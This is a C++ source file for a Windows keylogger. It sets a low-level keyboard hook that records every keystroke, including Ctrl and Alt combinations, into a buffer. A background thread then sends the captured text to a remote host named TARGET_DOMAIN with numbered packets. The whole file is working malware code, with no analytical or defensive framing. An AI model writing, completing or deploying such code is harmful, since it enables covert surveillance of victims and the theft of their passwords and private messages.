#include "KeyLogger.h"
#include "Network.h"


LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0 || nCode != HC_ACTION) {
		return CallNextHookEx(nullptr, nCode, wParam, lParam);
	}

	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
		
		// Check modifier states
		bool isCtrlPressed = GetAsyncKeyState(VK_CONTROL) & 0x8000;
		bool isAltPressed = GetAsyncKeyState(VK_MENU) & 0x8000;
		
		// Handle special keys with compact symbols
		std::string specialKey = "";
		switch (key->vkCode) {
			case VK_BACK:		specialKey = "[BS]"; break;
			case VK_TAB:       	specialKey = "[TAB]"; break;
			case VK_RETURN:    	specialKey = "[ENTR]"; break;
			case VK_SPACE:    	specialKey = " "; break;
			case VK_ESCAPE:    	specialKey = "[ESC]"; break;
			case VK_DELETE:    	specialKey = "[DEL]"; break;
			// Skip modifier keys alone - they'll be caught with combinations
			case VK_SHIFT:
			case VK_CONTROL:
			case VK_MENU:
			case VK_LWIN:
			case VK_RWIN:
			case VK_CAPITAL:
			case VK_SNAPSHOT:
			case VK_INSERT:
			case VK_PRIOR:
			case VK_NEXT:
			case VK_LEFT:
			case VK_RIGHT:
			case VK_UP:
			case VK_DOWN:
			case VK_HOME:
			case VK_END:
				// Ignore - too noisy or handled by combinations
				break;
		}
		
		if (!specialKey.empty()) {
			keystrokeBuffer += specialKey;
		} else if (key->vkCode >= 0x30) {  // Skip pure modifier keys
			// Try to translate normal keys
			GetKeyState(VK_SHIFT);
			BYTE keyboardState[256];
			if (!GetKeyboardState(keyboardState)) {
				return CallNextHookEx(nullptr, nCode, wParam, lParam);
			}
			
			unsigned short translatedChar[2] = {0};
			
			int result = ToAsciiEx(key->vkCode, key->scanCode, keyboardState, 
			                       translatedChar, key->flags, keyboardLayout);
			
			if (result == 1) {
				char keyChar = static_cast<char>(translatedChar[0]);
				
				// Log modifier + key combinations
				if (isCtrlPressed && !isAltPressed) {
					// Ctrl + Key
					keystrokeBuffer += "[^";
					if (key->vkCode >= 0x41 && key->vkCode <= 0x5A) {
						// A-Z keys
						keystrokeBuffer += (char)key->vkCode;
					} else {
						keystrokeBuffer += std::to_string(key->vkCode);
					}
					keystrokeBuffer += "]";
				} else if (isAltPressed) {
					// Alt + Key
					keystrokeBuffer += "[Alt+";
					if (key->vkCode >= 0x41 && key->vkCode <= 0x5A) {
						keystrokeBuffer += (char)key->vkCode;
					} else {
						keystrokeBuffer += std::to_string(key->vkCode);
					}
					keystrokeBuffer += "]";
				} else if (keyChar >= 32 && keyChar <= 126) {
					// Normal printable character (shift already handled by ToAsciiEx)
					keystrokeBuffer += keyChar;
				}
			}
		}
		
		// Send buffer when it reaches MAX_BUFFER size
		if (keystrokeBuffer.size() >= MAX_BUFFER) {
			{
				std::lock_guard<std::mutex> lock(queueMutex);
				sendQueue.push(keystrokeBuffer);
			}
			
			keystrokeBuffer.clear();
		}
	}
	
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

DWORD WINAPI senderThread(LPVOID lpParam) {
	while (!shouldStopSender) {
		std::string dataToSend;
		
		{
			std::lock_guard<std::mutex> lock(queueMutex);
			if (!sendQueue.empty()) {
				dataToSend = sendQueue.front();
				sendQueue.pop();
			}
		}
		
		if (!dataToSend.empty()) {
			int success = sendData(connectionId, keylog_packetNumber, 
			                       TARGET_DOMAIN.c_str(), dataToSend.c_str());
			
			if (success == 0) {
				keylog_packetNumber++;
				
				if (keylog_packetNumber > 999) {
					keylog_packetNumber = 0;
				}
			}
		} else {
			
			Sleep(100);
		}
	}
	
	return 0;
}